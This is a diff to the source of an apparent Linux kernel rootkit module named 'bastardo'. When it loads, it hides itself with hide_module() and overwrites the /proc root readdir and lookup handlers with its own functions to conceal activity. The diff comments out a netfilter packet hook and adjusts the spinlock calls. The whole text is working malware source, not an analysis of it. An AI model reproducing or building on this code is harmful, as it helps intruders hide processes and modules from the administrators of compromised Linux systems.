@@ -10,7 +10,7 @@
 #include "module.h"
 #include "hidemod.h"
 #include <linux/workqueue.h>
-
+#include <asm-generic/bug.h>
 
 /* This is the structure we shall use to register our function */
 static struct nf_hook_ops nfho;
@@ -41,36 +41,39 @@ void init_symbols(void)
 int init_module ()
 {
 	/* Fill in our hook structure */
-	nfho.hook = hook_func;
+//	nfho.hook = hook_func;
 
 	/* Handler function */
-	nfho.hooknum = NF_IP_PRE_ROUTING;	/* First for IPv4 */
-	nfho.pf = PF_INET;
-	nfho.priority = NF_IP_PRI_FIRST;	/* Make our func first */
+//	nfho.hooknum = NF_IP_PRE_ROUTING;	/* First for IPv4 */
+//	nfho.pf = PF_INET;
+//	nfho.priority = NF_IP_PRI_FIRST;	/* Make our func first */
 
-	nf_register_hook (&nfho);
+//	nf_register_hook (&nfho);
 
 	init_symbols();
 
 	// Safe pointer to us!
 	hidemod_setmodule(&__this_module);
 
-    // Hide the module.
+	// Hide the module.
 	hide_module();
-	
+
 	// Backup previous handlers.
 	proc_original_file_operations.readdir = proc_root.proc_fops->readdir;
 	proc_original_inode_operations.lookup = proc_root.proc_iops->lookup;
 	
 	// New handlers. With a bit of magic because the compiler is stupid
-	if(_proc_dir_spinlock)
-		spin_lock(&_proc_dir_spinlock);
+	if(_proc_dir_spinlock != NULL)
+		spin_lock(_proc_dir_spinlock);
 
 	((struct file_operations *)  ((void *)(proc_root.proc_fops)))->readdir = new_proc_readdir;
 	((struct inode_operations *) ((void *)(proc_root.proc_iops)))->lookup = new_proc_lookup;
   
-	if(_proc_dir_spinlock)
-		spin_unlock(&_proc_dir_spinlock);
+	if(_proc_dir_spinlock != NULL)
+		spin_unlock(_proc_dir_spinlock);
+
+
+
 
 	return 0;
 }
@@ -80,17 +83,17 @@ void cleanup_module ()
 {
 	printk("Removing module bastardo.");
 
-	nf_unregister_hook (&nfho);
+//	nf_unregister_hook (&nfho);
 
 	// Restore proc fs handlers.
-	if(_proc_dir_spinlock)
-		spin_lock(&_proc_dir_spinlock);
+	if(_proc_dir_spinlock != NULL)
+		spin_lock(_proc_dir_spinlock);
 
 	((struct file_operations *)  ((void *)(proc_root.proc_fops)))->readdir = proc_original_file_operations.readdir;
 	((struct inode_operations *) ((void *)(proc_root.proc_iops)))->lookup = proc_original_inode_operations.lookup ;
 
-	if(_proc_dir_spinlock)
-		spin_unlock(&_proc_dir_spinlock);
+	if(_proc_dir_spinlock != NULL)
+		spin_unlock(_proc_dir_spinlock);
 
 }
 
